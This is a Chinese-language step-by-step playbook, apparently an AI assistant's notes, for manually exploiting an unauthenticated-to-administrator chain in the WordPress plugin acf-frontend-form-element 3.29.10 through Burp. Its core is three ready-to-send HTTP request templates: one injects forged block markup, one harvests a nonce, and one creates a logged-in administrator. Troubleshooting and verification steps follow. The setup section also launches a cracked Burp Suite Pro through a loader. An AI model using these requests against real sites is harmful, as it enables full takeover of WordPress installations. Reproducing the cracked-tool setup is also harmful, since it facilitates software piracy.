# Burp 手工重放 FEA ChainQ 链（实战打法）

> 场景：用户要"像打真实站一样，挂 Burp 改包自己过一遍"，不跑脚本。
> 目标链：FEA acf-frontend-form-element 3.29.10 未认证 → 管理员（ChainQ 提权链）。
> 靶场：本地 phpStudy WordPress 7.0.3 + FEA 3.29.10，表单按前置条件配置好
> （form_key=form_public_submit / no_kses=1 / Content 字段 field_pub_content）。

## 环境准备
- Burp：`D:\Pentest\burp202405\BurpSuite\`（Pro 2024.5 + loader）。启动命令（git-bash 后台跑）：
  ```
  cd "/d/Pentest/burp202405/BurpSuite" && "/d/Pentest/burp202405/jdk/bin/java.exe" -XX:+IgnoreUnrecognizedVMOptions \
    --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED \
    --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED \
    --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -noverify \
    -javaagent:burpsuitloader1.jar=loader,hanizfy -jar burpsuite_pro_2024.5.jar
  ```
  （VBS 启动脚本在 git-bash 里常静默失败，直接 java 命令最稳。启动后代理监听 127.0.0.1:8080。）
- 浏览器：Chrome 挂代理 `--proxy-server=127.0.0.1:8080` 或 SwitchyOmega；访问 `http://localhost/?page_id=10`。
- 注意：Burp 拦 localhost 流量没问题（不走系统代理绕过）。

## 第 0 步：History 考古攻击素材
Proxy → HTTP History 找 `GET /?page_id=10` 响应，提取：
| 素材 | 来源 | 用途 |
|------|------|------|
| `_acf_form` | hidden input value（= form_public_submit） | form_submit 的表单标识 |
| `_acf_nonce` | hidden input value | form_submit 用 |
| 页面 JSON `"nonce":"..."` | 页面内 acf.data.nonce（正则 `"nonce":"(\w+)"`） | **change_form 用** |
| `_acf_objects` | hidden input value（加密对象 `{"post":"add_post"}`） | form_submit 必须带，决定"保存到新对象" |
| `data-key="field_pub_content"` | Content 字段 | acff[post][<key>] 的字段标识 |

⚠️ 两个 nonce 容易混：**change_form 用页面 JSON nonce（acf.data.nonce），form_submit 用 `_acf_nonce`**。
用错 = change_form 返回 "Authentication Error" / form_submit 返回 "No Form Data"。

## 三请求模板（全部未认证，无 Cookie）

### 请求 1 — 注入伪造块（创建含恶意配置的文章）
```
POST /wp-admin/admin-ajax.php  HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

action=frontend_admin/form_submit
_acf_form=form_public_submit
_acf_nonce=<第0步提取>
_acf_objects=<第0步提取>
_acf_screen=fea_form
_acf_validation=1
_acf_changed=0
_acf_status=
_acf_current_url=http://localhost/?page_id=10
acff[post][field_pub_content]=<!-- wp:frontend-admin/form {"form_key":"pwn","form_settings":{"save_to_user":"new_user","login_user":1}} /-->%0A%0A<!-- wp:frontend-admin/number-field {"name":"wp_capabilities","field_key":"cap"} /-->
```
- 响应 success=true → 数据库确认新文章 ID（wp_posts 最新 post，post_content 含 `wp:frontend-admin/form`）。
- no_kses=1 生效时块注释完整落库；若块被剥掉/转义 = kses 清洗开着，链断在这里。

### 请求 2 — change_form 渲染伪造表单（取提权 nonce）
```
POST /wp-admin/admin-ajax.php  HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=frontend_admin/forms/change_form
nonce=<页面JSON "nonce" 值>          ← 不是 _acf_nonce！
form_data=<新文章ID>_gutenberg_pwn
type=user
item_id=1
field_key=
```
- 响应 JSON `data.reload_form` HTML 里找 `_acf_nonce" value="..."` → 这是伪造表单的 nonce（提权提交用）。

### 请求 3 — 提权（创建管理员 + 自动登录）
```
POST /wp-admin/admin-ajax.php  HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=frontend_admin/form_submit
_acf_form=<新文章ID>_gutenberg_pwn
_acf_nonce=<请求2提取>
acff[user][<新文章ID>_gutenberg_cap][administrator]=1
_acf_current_url=http://localhost/?page_id=10
```
- 响应头 `Set-Cookie: wordpress_logged_in_*` ← **自动登录的管理员会话**。
- 数据库验证：`SELECT u.ID,u.user_login,um.meta_value FROM wp_users u JOIN wp_usermeta um ON u.ID=um.user_id AND um.meta_key='wp_capabilities' ORDER BY u.ID DESC LIMIT 1;` → 含 `administrator` = 提权成功。
- Repeater 用 Cookie 发 `GET /wp-admin/` → 200 仪表盘 = 完整接管。

## URL 编码坑（手工改包最高频翻车点）
块注释含：空格、双引号、`{`/`}`、`/`、换行——在 x-www-form-urlencoded body 里全部要编码：
- 空格 → `%20`（或 +，但 + 在 JSON 里会被解成空格，统一用 %20）
- `"` → `%22`，`{` → `%7B`，`}` → `%7D`，`/` → `%2F`（建议全编码）
- 换行 → `%0A`
- Burp 技巧：选中要编码的文本 → Ctrl+U（URL-encode key characters）一键搞定，别手打。

## 常见翻车 & 判定
| 现象 | 原因 |
|------|------|
| success=True 但数据库无新文章 | `_acf_objects` 缺失/错误（漏了"保存到新对象"信息） |
| change_form 报 Authentication Error | nonce 用成了 `_acf_nonce`（应该用页面 JSON nonce） |
| form_submit 报 No Form Data | `_acf_form` 不是 form_ 前缀（如裸 public_submit）或表单 ID 不对 |
| 块注释被剥掉只剩正文 | no_kses 没开（表单配置缺 no_kses=1） |
| 请求 3 success 但用户是 subscriber | 伪造块 name 不是 wp_capabilities / 字段 key 拼错 |

## 方法论
- 手工改包前先把页面全部 hidden 字段复制下来（History 响应里），照抄，别只挑"看起来有用"的——插件表单提交依赖完整 hidden 集（尤其 `_acf_objects`）。
- 用户自己动手时，我方角色 = 给模板 + 讲 nonce 区分 + 预告翻车点，别替他点 Burp。
